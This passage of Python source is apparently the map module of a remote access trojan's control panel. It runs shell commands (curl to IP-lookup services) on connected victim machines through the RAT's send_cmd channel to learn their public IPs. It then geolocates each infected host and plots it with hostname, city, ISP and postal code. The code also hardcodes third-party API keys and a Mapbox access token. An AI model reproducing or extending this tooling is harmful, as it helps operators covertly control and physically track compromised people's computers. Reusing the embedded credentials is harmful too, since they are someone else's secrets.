            self.log_message("No client found near this location")
            return
            
        # Get client IP
        client_info = self.client_locations.get(client_id, {}).get('info', {})
        self.log_message(client_info)
        ip = client_info.get('ip')
        if not ip:
            self.log_message("No IP address found for selected client")
            return
            
        # Perform precision scan for this client
        self.get_precise_location_for_ip(ip, client_id)
        
        # Update display
        self.show_client_details(coordinates)
    
    def find_closest_client(self, lat, lon):
        """Find the client ID closest to the given coordinates"""
        closest_client = None
        min_distance = float('inf')
        
        for client_id, location in self.client_locations.items():
            if 'lat' in location and 'lon' in location:
                # Calculate distance (simple Euclidean distance is sufficient for this purpose)
                distance = ((location['lat'] - lat) ** 2 + (location['lon'] - lon) ** 2) ** 0.5
                
                if distance < min_distance:
                    min_distance = distance
                    closest_client = client_id
        
        # Only return if the client is reasonably close (within ~50km)
        if min_distance < 0.5:  # Approximately 50km at the equator
            return closest_client
        
        return None
    
    def copy_coordinates(self, coordinates=None):
        """Copy coordinates to clipboard"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        
        # Format coordinates with high precision
        coord_string = f"{lat:.6f}, {lon:.6f}"
        
        # Copy to clipboard
        try:
            import tkinter as tk
            self.root = tk.Tk()
            self.root.withdraw()
            self.root.clipboard_clear()
            self.root.clipboard_append(coord_string)
            self.root.update()
            self.root.destroy()
            
            self.log_message(f"Coordinates copied to clipboard: {coord_string}")
        except Exception as e:
            self.log_message(f"Error copying to clipboard: {e}", is_error=True)
    
    def refresh_map(self):
        """Refresh the map with current client locations"""
        # First, update the locations of all connected clients
        self.update_all_client_locations()
        
        # Then update the map display
        if self.map_type == "tkinter":
            self.update_tkinter_map()
        elif self.map_type == "web":
            self.update_web_map()
        else:
            # No map loaded yet
            pass
    
    def update_all_client_locations(self):
        """Update the geographic locations of all connected clients with enhanced precision"""
        import threading
        import socket
        import ipaddress
        
        # Clear existing locations for current clients
        self.client_locations = {}
        
        # Get all connected clients
        for addr, (client_id, conn) in self.rat_app.clients.items():
            # Extract IP address
            ip = addr[0]
            
            # Skip invalid IPs
            if not self.is_valid_ip(ip):
                self.log_message(f"Invalid IP address for client {client_id}: {ip}", is_error=True)
                continue
            
            # Check if IP is local or private
            is_local_ip = self.is_local_ip(ip)
            
            if is_local_ip:
                if self.allow_local_ip_lookup:
                    try:
                        # For local clients, try to get public IP by asking them directly
                        if self.debug:
                            self.log_message(f"Attempting to get public IP for local client {client_id} at {ip}")
                            
                        public_ip = self.get_client_public_ip(conn)
                        if public_ip and public_ip != ip and self.is_valid_ip(public_ip):
                            # Log the public IP found
                            if self.debug:
                                self.log_message(f"Found public IP {public_ip} for client on local IP {ip}")
                                
                            self.rat_app.log(f"Using public IP {public_ip} for geolocation of client {client_id}")
                            
                            # Check if we have this public IP in the cache
                            if public_ip in self.ip_cache and not self.is_cache_expired(public_ip):
                                self.client_locations[client_id] = self.ip_cache[public_ip].copy()
                                self.client_locations[client_id]["info"]["hostname"] = self.get_client_hostname(conn)
                                self.client_locations[client_id]["info"]["ip"] = ip  # Keep the original IP
                                self.client_locations[client_id]["info"]["public_ip"] = public_ip  # Store public IP too
                            else:
                                # Start a thread to get the location of the public IP
                                thread = threading.Thread(target=self.get_location_for_client, 
                                                      args=(public_ip, client_id, conn))
                                thread.daemon = True
                                thread.start()
                            continue
                        else:
                            if self.debug:
                                self.log_message(f"Could not determine public IP for local client {client_id}")
                    except Exception as e:
                        if self.debug:
                            self.log_message(f"Error getting public IP for {client_id}: {e}", is_error=True)
                
                # Use different handling strategies based on precision level
                precision_level = self.precision_var.get().lower()
                
                if precision_level == "high":
                    # For high precision, try external IP detection services
                    self.handle_local_client_high_precision(client_id, ip, conn)
                elif precision_level == "approximate":
                    # For approximate, just use a placeholder location
                    self.handle_local_client_low_precision(client_id, ip, conn)
                else:
                    # Standard precision - use Google HQ (or similar neutral location)
                    self.handle_local_client_standard_precision(client_id, ip, conn)
            else:
                # Regular public IP - check cache first
                if ip in self.ip_cache and not self.is_cache_expired(ip):
                    self.client_locations[client_id] = self.ip_cache[ip].copy()
                    self.client_locations[client_id]["info"]["hostname"] = self.get_client_hostname(conn)
                else:
                    # Start a thread to get the location to avoid blocking
                    thread = threading.Thread(target=self.get_location_for_client, 
                                           args=(ip, client_id, conn))
                    thread.daemon = True
                    thread.start()
    
    def handle_local_client_high_precision(self, client_id, ip, conn):
        """Handle local IP client with high precision strategy"""
        # Try various methods to determine approximate location
        
        # Method 1: Try browser geolocation API via client
        # Method 2: Try Wi-Fi geolocation database lookup
        # Method 3: Try carrier IP database
        
        # For now, fall back to ISP location or regional approximation
        import random
        
        # Use locally-relevant coordinates based on system locale or other hints
        try:
            import locale
            country_code = locale.getdefaultlocale()[0].split('_')[1]
            country_coords = self.get_country_center(country_code)
            
            if country_coords:
                lat, lon = country_coords
                # Add some randomness within the country
                lat += random.uniform(-0.5, 0.5)
                lon += random.uniform(-0.5, 0.5)
                
                self.client_locations[client_id] = {
                    "lat": lat,
                    "lon": lon,
                    "info": {
                        "ip": ip,
                        "hostname": self.get_client_hostname(conn),
                        "location": f"Approximate location in {self.get_country_name(country_code)}",
                        "confidence": "low",
                        "accuracy": 50000,  # 50km accuracy
                        "note": "Local IP - approximated based on system locale"
                    }
                }
                return
        except Exception as e:
            self.log_message(f"Error in high-precision local IP handling: {e}", is_error=True)
        
        # Fall back to standard precision if all else fails
        self.handle_local_client_standard_precision(client_id, ip, conn)
    
    def handle_local_client_standard_precision(self, client_id, ip, conn):
        """Handle local IP client with standard precision strategy"""
        # Use a neutral location like Google HQ
        self.client_locations[client_id] = {
            "lat": 37.422,  # Google HQ latitude
            "lon": -122.084,  # Google HQ longitude
            "info": {
                "ip": ip,
                "hostname": self.get_client_hostname(conn),
                "location": "Local Network (Approximate)",
                "confidence": "low",
                "accuracy": 10000,  # 10km accuracy
                "note": "Local IP - location is approximate"
            }
        }
        
        if self.debug:
            self.log_message(f"Using standard precision location for local client {client_id}")
    
    def handle_local_client_low_precision(self, client_id, ip, conn):
        """Handle local IP client with low precision strategy"""
        # Use zeros which will display as 'unknown location'
        self.client_locations[client_id] = {
            "lat": 0,
            "lon": 0,
            "info": {
                "ip": ip,
                "hostname": self.get_client_hostname(conn),
                "location": "Local Network (Unknown)",
                "confidence": "unknown",
                "accuracy": 100000,  # 100km accuracy
                "note": "Local IP - location unknown"
            }
        }
        
        if self.debug:
            self.log_message(f"Using low precision location for local client {client_id}")
    
    def is_valid_ip(self, ip):
        """Check if an IP address is valid"""
        try:
            import ipaddress
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def is_local_ip(self, ip):
        """Check if an IP address is local/private"""
        try:
            import ipaddress
            ip_obj = ipaddress.ip_address(ip)
            
            # Check for loopback
            if ip_obj.is_loopback:
                return True
                
            # Check for private addresses
            if ip_obj.is_private:
                return True
                
            # Check for specific ranges
            if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16."):
                return True
            return False
        except ValueError:
            return False
    
    def is_cache_expired(self, ip):
        """Check if cached IP location data has expired"""
        if ip not in self.cache_expiry:
            return True
            
        import time
        current_time = time.time()
        
        # Return True if cache has expired
        return current_time > self.cache_expiry[ip]
    
    def get_client_hostname(self, conn):
        """Get the hostname for a client connection"""
        try:
            # Try to get hostname using the RAT command
            if hasattr(self.rat_app, 'getHostName'):
                return self.rat_app.getHostName(conn)
            else:
                return "Unknown"
        except:
            return "Unknown"
    
    def get_client_public_ip(self, conn):
        """Attempt to get the client's public IP address using multiple services"""
        try:
            # Try different IP detection services in order
            services = [
                "https://ipinfo.io/ip",
                "https://icanhazip.com",
                "https://ifconfig.me/ip"
            ]
            
            # Send a special command to the client to get its public IP
            if hasattr(self.rat_app, 'send_cmd'):
                for service in services:
                    try:
                        # Use curl to get the IP from the service
                        command = f"curl -s {service}"
                        result, _ = self.rat_app.send_cmd(conn, command)
                        public_ip = result.decode().strip()
                        
                        # Validate the IP
                        if self.is_valid_ip(public_ip) and not self.is_local_ip(public_ip):
                            return public_ip
                    except Exception as e:
                        if self.debug:
                            self.log_message(f"Error using {service}: {e}", is_error=True)
                        continue
            
            # If we get here, all services failed
            return None
        except Exception as e:
            self.log_message(f"Error getting client's public IP: {e}", is_error=True)
            return None
    
    def get_location_for_client(self, ip, client_id, conn):
        """Get geographic location for a client IP and update the map"""
        import time
        
        # Try to get location data
        location_data = self.get_ip_location(ip)
        
        if location_data and 'latitude' in location_data and 'longitude' in location_data:
            # Validate coordinates (some APIs return 0,0 for unknown locations)
            lat = location_data['latitude']
            lon = location_data['longitude']
            
            # If coordinates are 0,0 or None, try backup method
            if (lat == 0 and lon == 0) or lat is None or lon is None:
                # Try backup geolocation method
                backup_location = self.get_backup_location(ip)
                if backup_location:
                    lat = backup_location['latitude']
                    lon = backup_location['longitude']
                    # Update other location data if available
                    for key in backup_location:
                        if key not in location_data or not location_data[key]:
                            location_data[key] = backup_location[key]
            
            # Enhance with additional data like accuracy and confidence
            confidence = "medium"  # Default confidence
            accuracy = location_data.get('accuracy', 10000)  # Default 10km radius
            
            # If we have city-level data, improve confidence and accuracy
            if location_data.get('city') and location_data.get('region_name'):
                confidence = "medium"
                accuracy = 5000  # ~5km radius for city-level
            
            # If we have latitude/longitude with high precision
            if lat is not None and lon is not None and accuracy < 1000:
                confidence = "high"
            
            # If we have valid coordinates, store the location
            if lat and lon and not (lat == 0 and lon == 0):
                # Generate a formatted location string
                location_str = ""
                if location_data.get('city'):
                    location_str += location_data.get('city')
                if location_data.get('region_name'):
                    if location_str:
                        location_str += ", "
                    location_str += location_data.get('region_name')
                if location_data.get('country_name'):
                    if location_str:
                        location_str += ", "
                    location_str += location_data.get('country_name')
                
                # Store in the cache and client locations dict
                self.ip_cache[ip] = {
                    "lat": lat,
                    "lon": lon,
                    "info": {
                        "ip": ip,
                        "hostname": self.get_client_hostname(conn),
                        "location": location_str,
                        "country_code": location_data.get('country_code', ''),
                        "region": location_data.get('region_name', ''),
                        "city": location_data.get('city', ''),
                        "zip": location_data.get('zip', ''),
                        "timezone": location_data.get('time_zone', {}).get('name', ''),
                        "isp": location_data.get('isp', ''),
                        "confidence": confidence,
                        "accuracy": accuracy,
                        "source": location_data.get('source', 'ipstack')
                    }
                }
                
                # Set cache expiration time
                import time
                self.cache_expiry[ip] = time.time() + self.cache_expiration_time
                
                # Copy to client locations
                self.client_locations[client_id] = self.ip_cache[ip].copy()
                
                # Update the map display after a short delay
                time.sleep(0.5)  # Avoid too many rapid updates if multiple threads
                self.map_frame.after(0, self.refresh_map)
            else:
                # If we still don't have valid coordinates, log the issue
                self.log_message(f"Unable to get valid coordinates for IP: {ip}", is_error=True)
    
    def log_message(self, msg, is_error=False):
        """Add a message to the log display"""
        import tkinter as tk
        import time
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_entry = f"[{timestamp}] {str(msg)}"
        
        # Update log in UI
        self.log_text.config(state=tk.NORMAL)
        
        # Add color tag if it's an error
        if is_error:
            self.log_text.insert(tk.END, log_entry + "\n", "error")
            # Configure the error tag if it doesn't exist
            try:
                self.log_text.tag_config("error", foreground="red")
            except:
                pass
        else:
            self.log_text.insert(tk.END, log_entry + "\n")
            
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
        # Also log to the main application log if available
        if hasattr(self.rat_app, 'log'):
            self.rat_app.log(msg)
    
    def get_ip_location(self, ip):
        """Get geographic location data for an IP address using multiple external APIs"""
        import requests
        
        # Create a base default response
        default_response = {
            'latitude': None,
            'longitude': None,
            'country_name': '',
            'country_code': '',
            'region_name': '',
            'city': '',
            'zip': '',
            'time_zone': {'name': ''},
            'isp': '',
            'accuracy': 10000,  # Default 10km accuracy
            'source': 'default'
        }
        
        # Try ipstack API first if available
        if self.ipstack_api_key != "0c84ae78bf00f2eeb7280af1803f93d5" and self.services_status['ipstack']['available']:
            try:
                protocol = "https" if self.use_https else "http"
                response = requests.get(
                    f"{protocol}://api.ipstack.com/{ip}?access_key={self.ipstack_api_key}&fields=ip,latitude,longitude,country_name,country_code,region_name,city,zip,location",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'latitude' in data and 'longitude' in data:
                        # Convert response to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': data.get('latitude'),
                            'longitude': data.get('longitude'),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code', ''),
                            'region_name': data.get('region_name', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zip', ''),
                            'accuracy': data.get('location', {}).get('accuracy_radius', 10000) * 1000,  # Convert km to m
                            'source': 'ipstack'
                        })
                        
                        # Check if we have timezone info
                        if 'location' in data and 'time_zone' in data['location']:
                            result['time_zone'] = {'name': data['location']['time_zone']}
                        
                        # Check for valid lat/long (not 0,0)
                        if (result['latitude'] != 0 or result['longitude'] != 0):
                            self.services_status['ipstack']['available'] = True
                            self.services_status['ipstack']['error_count'] = 0
                            return result
            except Exception as e:
                self.log_message(f"Error with ipstack API: {e}", is_error=True)
                self.services_status['ipstack']['available'] = False
                self.services_status['ipstack']['last_error'] = str(e)
                self.services_status['ipstack']['error_count'] += 1
        
        # Try ipinfo.io if available
        if self.ipinfo_token != "58950d8a1c1383" and self.services_status['ipinfo']['available']:
            try:
                response = requests.get(
                    f"https://ipinfo.io/{ip}/json?token={self.ipinfo_token}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'loc' in data and data['loc']:
                        try:
                            lat, lon = data['loc'].split(',')
                            lat, lon = float(lat), float(lon)
                            
                            # Convert to standard format
                            result = default_response.copy()
                            result.update({
                                'latitude': lat,
                                'longitude': lon,
                                'country_name': data.get('country', ''),
                                'country_code': data.get('country', ''),
                                'region_name': data.get('region', ''),
                                'city': data.get('city', ''),
                                'zip': data.get('postal', ''),
                                'time_zone': {'name': data.get('timezone', '')},
                                'isp': data.get('org', ''),
                                'accuracy': 5000,  # ipinfo is usually city-level accurate (~5km)
                                'source': 'ipinfo'
                            })
                            
                            self.services_status['ipinfo']['available'] = True
                            self.services_status['ipinfo']['error_count'] = 0
                            return result
                        except:
                            pass
            except Exception as e:
                self.log_message(f"Error with ipinfo.io: {e}", is_error=True)
                self.services_status['ipinfo']['available'] = False
                self.services_status['ipinfo']['last_error'] = str(e)
                self.services_status['ipinfo']['error_count'] += 1
        
        # Try IP-API (free, but rate limited)
        if self.services_status['ipapi']['available']:
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        # Convert to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': data.get('lat'),
                            'longitude': data.get('lon'),
                            'country_name': data.get('country', ''),
                            'country_code': data.get('countryCode', ''),
                            'region_name': data.get('regionName', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zip', ''),
                            'time_zone': {'name': data.get('timezone', '')},
                            'isp': data.get('isp', ''),
                            'accuracy': 5000,  # city-level accuracy
                            'source': 'ip-api.com'
                        })
                        
                        self.services_status['ipapi']['available'] = True
                        self.services_status['ipapi']['error_count'] = 0
                        return result
            except Exception as e:
                self.log_message(f"Error with ip-api.com: {e}", is_error=True)
                self.services_status['ipapi']['available'] = False
                self.services_status['ipapi']['last_error'] = str(e)
                self.services_status['ipapi']['error_count'] += 1
        
        # Try free geolocation-db.com service as last resort
        if self.services_status['freegeoip']['available']:
            try:
                response = requests.get(f"https://geolocation-db.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('latitude') and data.get('longitude'):
                        # Convert to standard format
                        result = default_response.copy()
                        result.update({
                            'latitude': float(data.get('latitude')),
                            'longitude': float(data.get('longitude')),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code', ''),
                            'region_name': data.get('state', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('postal', ''),
                            'time_zone': {'name': ''},
                            'isp': '',
                            'accuracy': 25000,  # lower accuracy for this free service
                            'source': 'geolocation-db.com'
                        })
                        
                        self.services_status['freegeoip']['available'] = True
                        self.services_status['freegeoip']['error_count'] = 0
                        return result
            except Exception as e:
                self.log_message(f"Error with geolocation-db.com: {e}", is_error=True)
                self.services_status['freegeoip']['available'] = False
                self.services_status['freegeoip']['last_error'] = str(e)
                self.services_status['freegeoip']['error_count'] += 1
        
        # Return None if all methods fail
        return None
    
    def get_backup_location(self, ip):
        """Use alternative geolocation services as backup"""
        import requests
        
        # First, try ipgeolocation.io if available
        if self.ipgeolocation_api_key != "df6c850929e54ae1801e2472127b1a8c" and self.services_status['ipgeolocation']['available']:
            try:
                response = requests.get(
                    f"https://api.ipgeolocation.io/ipgeo?apiKey={self.ipgeolocation_api_key}&ip={ip}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'latitude' in data and 'longitude' in data:
                        return {
                            'latitude': float(data.get('latitude')),
                            'longitude': float(data.get('longitude')),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code2', ''),
                            'region_name': data.get('state_prov', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zipcode', ''),
                            'time_zone': {'name': data.get('time_zone', {}).get('name', '')},
                            'isp': data.get('isp', ''),
                            'accuracy': 5000,  # city-level accuracy
                            'source': 'ipgeolocation.io'
                        }
            except Exception as e:
                self.log_message(f"Error with ipgeolocation.io: {e}", is_error=True)
                self.services_status['ipgeolocation']['available'] = False
                self.services_status['ipgeolocation']['last_error'] = str(e)
                self.services_status['ipgeolocation']['error_count'] += 1
        
        # Try ipapi.co (another free service)
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    return {
                        'latitude': data.get('latitude'),
                        'longitude': data.get('longitude'),
                        'country_name': data.get('country_name', ''),
                        'country_code': data.get('country_code', ''),
                        'region_name': data.get('region', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('postal', ''),
                        'time_zone': {'name': data.get('timezone', '')},
                        'isp': data.get('org', ''),
                        'accuracy': 10000,  # less precise
                        'source': 'ipapi.co'
                    }
        except Exception as e:
            self.log_message(f"Error with ipapi.co: {e}", is_error=True)
        
        # Try extreme-ip-lookup.com (another free alternative)
        try:
            response = requests.get(f"https://extreme-ip-lookup.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('lat') and data.get('lon'):
                    return {
                        'latitude': float(data.get('lat')),
                        'longitude': float(data.get('lon')),
                        'country_name': data.get('country', ''),
                        'country_code': data.get('countryCode', ''),
                        'region_name': data.get('region', ''),
                        'city': data.get('city', ''),
                        'zip': '',
                        'time_zone': {'name': ''},
                        'isp': data.get('isp', ''),
                        'accuracy': 25000,  # low precision
                        'source': 'extreme-ip-lookup.com'
                    }
        except Exception as e:
            self.log_message(f"Error with extreme-ip-lookup.com: {e}", is_error=True)
        
        # Return None if all backup methods fail
        return None
    
    def get_ipstack_location(self, ip):
        """Get location data from ipstack API"""
        if self.ipstack_api_key == "0c84ae78bf00f2eeb7280af1803f93d5":
            return None
            
        import requests
        try:
            protocol = "https" if self.use_https else "http"
            response = requests.get(
                f"{protocol}://api.ipstack.com/{ip}?access_key={self.ipstack_api_key}&fields=ip,latitude,longitude,country_name,country_code,region_name,city,zip,location",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    # Add source information
                    data['source'] = 'ipstack'
                    data['accuracy'] = data.get('location', {}).get('accuracy_radius', 10) * 1000  # Convert km to m
                    return data
        except Exception as e:
            self.log_message(f"Error with ipstack API: {e}", is_error=True)
        
        return None
    
    def get_ipinfo_location(self, ip):
            """Get location data from ipinfo.io API"""
            if self.ipinfo_token == "58950d8a1c1383":
                return None
                
            import requests
            try:
                response = requests.get(
                    f"https://ipinfo.io/{ip}/json?token={self.ipinfo_token}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'loc' in data and data['loc']:
                        try:
                            lat, lon = data['loc'].split(',')
                            lat, lon = float(lat), float(lon)
                            
                            # Create result in standard format
                            result = {
                                'latitude': lat,
                                'longitude': lon,
                                'country_name': data.get('country', ''),
                                'country_code': data.get('country', ''),
                                'region_name': data.get('region', ''),
                                'city': data.get('city', ''),
                                'zip': data.get('postal', ''),
                                'time_zone': {'name': data.get('timezone', '')},
                                'isp': data.get('org', ''),
                                'accuracy': 5000,  # ipinfo is usually city-level accurate (~5km)
                                'source': 'ipinfo'
                            }
                            
                            return result
                        except Exception as e:
                            self.log_message(f"Error parsing ipinfo.io response: {e}", is_error=True)
            except Exception as e:
                self.log_message(f"Error with ipinfo.io: {e}", is_error=True)
            
            return None
    
    def get_ipgeolocation_location(self, ip):
        """Get location data from ipgeolocation.io API"""
        if self.ipgeolocation_api_key == "df6c850929e54ae1801e2472127b1a8c":
            return None
            
        import requests
        try:
            response = requests.get(
                f"https://api.ipgeolocation.io/ipgeo?apiKey={self.ipgeolocation_api_key}&ip={ip}",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    # Convert to standard format
                    result = {
                        'latitude': float(data.get('latitude')),
                        'longitude': float(data.get('longitude')),
                        'country_name': data.get('country_name', ''),
                        'country_code': data.get('country_code2', ''),
                        'region_name': data.get('state_prov', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('zipcode', ''),
                        'time_zone': {'name': data.get('time_zone', {}).get('name', '')},
                        'isp': data.get('isp', ''),
                        'accuracy': 5000,  # city-level accuracy
                        'source': 'ipgeolocation.io'
                    }
                    
                    return result
        except Exception as e:
            self.log_message(f"Error with ipgeolocation.io: {e}", is_error=True)
        
        return None
    
    def get_ipapi_location(self, ip):
        """Get location data from ip-api.com"""
        import requests
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    # Convert to standard format
                    result = {
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'country_name': data.get('country', ''),
                        'country_code': data.get('countryCode', ''),
                        'region_name': data.get('regionName', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('zip', ''),
                        'time_zone': {'name': data.get('timezone', '')},
                        'isp': data.get('isp', ''),
                        'accuracy': 5000,  # city-level accuracy
                        'source': 'ip-api.com'
                    }
                    
                    return result
        except Exception as e:
            self.log_message(f"Error with ip-api.com: {e}", is_error=True)
        
        return None
    
    def update_tkinter_map(self):
        """Update the tkinter map with current client locations"""
        if self.map_type != "tkinter":
            return
            
        # Clear existing markers
        for marker_id in list(self.markers.keys()):
            marker = self.markers[marker_id]
            marker.delete()
        
        self.markers = {}
        
        # Add markers for all clients
        for client_id, location in self.client_locations.items():
            # Skip if coordinates are not valid (e.g. 0,0)
            if 'lat' not in location or 'lon' not in location:
                continue
                
            # Skip if coordinates are 0,0 (usually indicates failed geolocation)
            if location['lat'] == 0 and location['lon'] == 0:
                continue
                
            # Get client info
            info = location.get('info', {})
            ip = info.get('ip', 'Unknown')
            hostname = info.get('hostname', 'Unknown')
            location_name = info.get('location', 'Unknown')
            confidence = info.get('confidence', 'low')
            
            # Create marker with custom appearance based on confidence level
            if confidence == 'high':
                marker_color = "green"
                marker_text = client_id
            elif confidence == 'medium':
                marker_color = "orange"
                marker_text = client_id
            else:
                marker_color = "red"
                marker_text = "?"
                
            # Add the marker
            marker = self.map_widget.set_marker(
                location['lat'], 
                location['lon'], 
                text=marker_text,
                marker_color_circle=marker_color,
                command=self.on_marker_click
            )
            
            # Store in our markers dict with client_id as key
            self.markers[client_id] = marker
            
            # Set custom data on the marker for later use
            marker.client_id = client_id
        
        # Center map if clients are present
        if self.markers:
            # Find center of all markers
            total_lat = 0
            total_lon = 0
            count = 0
            
            for client_id, location in self.client_locations.items():
                if 'lat' in location and 'lon' in location and location['lat'] != 0 and location['lon'] != 0:
                    total_lat += location['lat']
                    total_lon += location['lon']
                    count += 1
            
            if count > 0:
                center_lat = total_lat / count
                center_lon = total_lon / count
                
                # Calculate appropriate zoom level based on client spread
                if count == 1:
                    zoom = 10  # City level for single client
                elif count <= 3:
                    zoom = 6   # Region level for a few clients
                elif count <= 10:
                    zoom = 4   # Country level
                else:
                    zoom = 2   # World level for many distributed clients
                
                # Set the map view
                self.map_widget.set_position(center_lat, center_lon)
                self.map_widget.set_zoom(zoom)
    
    def update_web_map(self):
        """Update the web-based map with current client locations"""
        if self.map_type != "web":
            return
            
        # For web-based map, we need to regenerate the HTML
        map_html = self.generate_web_map_html()
        
        # Update the HTML frame
        try:
            self.html_frame.load_html(map_html)
        except Exception as e:
            self.log_message(f"Error updating web map: {e}", is_error=True)
    
    def on_marker_click(self, marker):
        """Handle marker click event"""
        # Get client_id from marker
        client_id = getattr(marker, 'client_id', None)
        
        if client_id and client_id in self.client_locations:
            self.display_client_info(client_id)
    
    def show_client_details(self, coordinates=None):
        """Show client details for client nearest to the given coordinates"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        client_id = self.find_closest_client(lat, lon)
        
        if client_id:
            self.display_client_info(client_id)
        else:
            self.log_message("No client found near this location")
    
    def display_client_info(self, client_id):
        """Display client information in the info panel"""
        import tkinter as tk
        
        if client_id not in self.client_locations:
            return
            
        # Get client data
        location = self.client_locations[client_id]
        info = location.get('info', {})
        
        # Update basic info text
        self.client_info_text.config(state=tk.NORMAL)
        self.client_info_text.delete(1.0, tk.END)
        
        basic_info = f"Client ID: {client_id}\n"
        basic_info += f"Hostname: {info.get('hostname', 'Unknown')}\n"
        basic_info += f"IP: {info.get('ip', 'Unknown')}\n"
        
        if info.get('public_ip') and info.get('public_ip') != info.get('ip'):
            basic_info += f"Public IP: {info.get('public_ip')}\n"
            
        basic_info += f"Location: {info.get('location', 'Unknown')}\n"
        basic_info += f"Coordinates: {location.get('lat', 0):.6f}, {location.get('lon', 0):.6f}\n"
        basic_info += f"Precision: {info.get('confidence', 'Unknown').title()}\n"
        
        self.client_info_text.insert(tk.END, basic_info)
        self.client_info_text.config(state=tk.DISABLED)
        
        # Update detailed location info
        self.location_info_text.config(state=tk.NORMAL)
        self.location_info_text.delete(1.0, tk.END)
        
        location_info = f"City: {info.get('city', 'Unknown')}\n"
        location_info += f"Region: {info.get('region', 'Unknown')}\n"
        location_info += f"Country: {info.get('country_name', 'Unknown')} ({info.get('country_code', 'Unknown')})\n"
        location_info += f"Postal Code: {info.get('zip', 'Unknown')}\n"
        location_info += f"Timezone: {info.get('timezone', 'Unknown')}\n"
        location_info += f"ISP: {info.get('isp', 'Unknown')}\n"
        location_info += f"Accuracy: {info.get('accuracy', 'Unknown')} meters\n"
        location_info += f"Data Source: {info.get('source', 'Unknown')}\n"
        
        if info.get('note'):
            location_info += f"\nNote: {info.get('note')}"
        
        self.location_info_text.insert(tk.END, location_info)
        self.location_info_text.config(state=tk.DISABLED)
    
    def change_map_provider(self, provider):
        """Change the map provider"""
        if self.map_type == "tkinter":
            # Update the map tiles based on provider
            if provider == "OpenStreetMap":
                self.map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png")
            elif provider == "Mapbox":
                # Mapbox requires an API key
                self.map_widget.set_tile_server("https://api.mapbox.com/styles/v1/mapbox/streets-v11/tiles/{z}/{x}/{y}?access_token=pk.eyJ1IjoiYXBrYWxlc3MiLCJhIjoiY205YWFkY3BlMDJ3YTJqczdlZDh1MGwycCJ9.MdnO3e-mGmmuXd2tG88t_Q")
            elif provider == "Google Maps":
                # Not directly supported in tkintermapview, use a compatible tile server
                self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}")
            elif provider == "ESRI":
                self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}")
                
            # Log the change
            self.log_message(f"Map provider changed to {provider}")
            
        elif self.map_type == "web":
            # For web-based map, update the tile layer and regenerate
            # The change will be applied in generate_web_map_html
            self.update_web_map()
    
    def change_map_type(self, map_type):
        """Change the map type (street, satellite, etc.)"""
        if self.map_type == "tkinter":
            # Update the map tiles based on type
            provider = self.provider_var.get()
            
            if provider == "Google Maps":
                if map_type == "Satellite":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}")
                elif map_type == "Hybrid":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}")
                elif map_type == "Terrain":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=p&x={x}&y={y}&z={z}")
                else:  # Street
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}")
            
            elif provider == "ESRI":
                if map_type == "Satellite":
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}")
                elif map_type == "Terrain":
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}")
                else:  # Street
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}")
            
            # Log the change
            self.log_message(f"Map type changed to {map_type}")
            
        elif self.map_type == "web":
            # For web-based map, update the tile layer and regenerate
            self.update_web_map()
    
    def change_precision_level(self, level):
        """Change the location precision level"""
        self.log_message(f"Precision level changed to {level}")
        
        # Update the precision threshold based on level
        if level == "High":
            self.precision_threshold = 500  # 500 meters
        elif level == "Standard":
            self.precision_threshold = 1000  # 1 kilometer
        else:  # Approximate
            self.precision_threshold = 10000  # 10 kilometers
    
    def toggle_local_ip_lookup(self):
        """Toggle whether to resolve local IPs"""
